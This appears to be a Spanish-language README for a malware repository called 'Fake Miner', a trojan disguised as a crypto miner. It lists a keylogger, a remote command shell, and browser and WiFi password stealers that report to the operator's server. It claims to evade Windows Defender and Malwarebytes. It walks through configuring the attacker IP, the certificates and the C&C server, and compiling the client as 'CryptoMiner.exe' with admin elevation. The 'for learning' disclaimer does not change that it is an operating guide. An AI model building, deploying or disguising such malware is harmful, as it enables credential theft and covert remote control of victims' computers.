# Fake Miner!

---
    El objetivo de este repositorio es para el aprendizaje, no me hago responsable del uso
    que se le puede dar a este respositorio!

---


Features:

         Este fakeminer, en el ordenador en el que se ejecute, te da acceso a un 
         par de conexiones CIFRADAS con el ordenador victima, en resumen:
               
            Tienes acceso a:
               1. Ejeccion remota de comandos (conex. cifrada) :5001
               2. Keylogger en tiempo real (conex. cifrada) :5000
               3. Contraseñas en navegadores (edge/brave/google) (conex. cifrada) :5002
               4. Contraseñas wifi guardadas (conex. cifrada) :5002

         Testeado con windows defender y malwarebytes, no da positivo!   
--- 
# Explicacion

      Al ejecutar el server.py, solamente veremos la reverse shell, lo demas se esta guardando 
      en el escritorio. Si queremos 

---

Dependecias

            1. Necesitaremos instalar el archivo requierements.py:
                  
                       $ pip install -r requiremenets.txt
            
            2. Tambien requerimos de netcat (no nc)
                  ║       
                  ╚═► Linux:   sudo apt-get install -y netcat
                  ║       
                  ╚═► Windows:  https://nmap.org/dist/nmap-7.94-setup.exe 
                                    (Aseguraos de instalar netcat)
---
Files:
      
      client/keylog_command.py -->  Real-Time keylogger & C&C (Principal)
      client/find_interests.py -->  Password Stealer (edge/brave/google)
      client/get_points.py     -->  Wifi Password Stealer
      client/CryptoPhenix.py   -->  Used for chipher or decipher data
      client/certs.py          -->  Certs for cipher the comms
---

      server/cmd_cntr.py       -->  Command & Control Server
      server/recv_cred.py      -->  Recive ALL passwords stealed
      server/server.py         -->  Main file to start the server listen
      server/certs.py          -->  Certs for cipher the comms

---
# Preapración (MANUAL)

### Certificados: 
Recurso ---> https://cyberchef.org/

      Ejecutamos el create_certs.py, nos dará de resultado 2 archivos
         key.pem y cert.pem

      Estos archivos los encodeamos en base64 y los pegamos en los archivos 
      certs.py (client/server)   

      Funcion crte == cert.pem
      Funcion locker == key.pem

   ![img_1.png](img/img_1.png)


### 1. Preparar IP

      Una vez hecho esto correctamente....
   
      Nos dirigimos a la carpeta client y debemos especificar la direccion IP
      para que nos lleguen las conexiones.

      En los archivos "find_interest.py", "get_points.py" y keylog_command.py" tenemos una
      función llamada "know_gme()"
         
      En esta funcion debemos especificar la direccion IP. Ahora tenemos dos opciones:
   #### i. Encritpar IP:
         
         Ejecutamos el archivo "client/CryptoPhenix" nos pedira una IP.
         
         La parte que nos interesa es la de RESULT, que es la IP encriptada + la clave para desencriptar
   ![img_3.png](img/img_3.png)
            
   #### ii. IP sin encriptar

            Simplemente escribimos la IP como veremos en el siguiente punto
   
### 2. Escribimos IP:

         Abrimos los archivos y modificamos la funcion, si hemos encriptado la IP
         Pegamos el resultado en "unkown"
   ![img_4.png](img/img_4.png)
         
         Por otra parte, si no, solamente hacemos un return de la IP:

   ![img_5.png](img/img_5.png)
      

### 3. Preapramos servidor


      Para esta parte podremos usar un linux o windows.
      
      Necesitamos la herramineta "ncat" bien instalada...
---
      Si ejecutamos el archivo server/server.py, el servidor estará montado y bien preparado
      
      Si ejecutamos el archivo principal client/keylog_command.py deberiamos de recibir todas las 
      conexiones!

      En el caso de que no nos funcione, tenemos que generar unos certificados nuevos para el cliente y servidor!

# Compilación

      Para esto necesitaremos de un Windows SI O SI, ya que utilizamos una libreria llamada win32crypt
      solo disponible para Windows...

      Para Generar el .exe ejecutaremos el siguente comando en la carpte "Client":
---
      C:\WINDOWS\system32> pyinstaller --onefile --clean -n CryptoMiner.exe --uac-admin --icon=minericon.ico keylog_commamnd.py
---
# Proximamente!

#### Preparacion Automática:

      Ejecutar archivo "prepare.py"

